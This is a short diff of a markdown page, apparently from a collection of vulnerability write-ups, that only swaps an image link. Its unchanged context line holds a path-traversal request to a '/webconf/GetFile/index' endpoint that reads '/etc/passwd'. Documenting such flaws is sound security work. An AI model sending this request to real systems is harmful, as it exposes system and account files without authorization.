@@ -28,4 +28,4 @@
 /webconf/GetFile/index?path=../../../../../../../../../../../../../../etc/passwd
 ```
 
-![img](../../../.vuepress/public/img/1687844048220-9698fde6-1bdd-4068-bfa6-c5bdda190d42.png)
+![image.png](../../../.vuepress/public/img/1688361725621-1d85a406-2f2c-492a-8c0f-5d54ea282f2a.png)
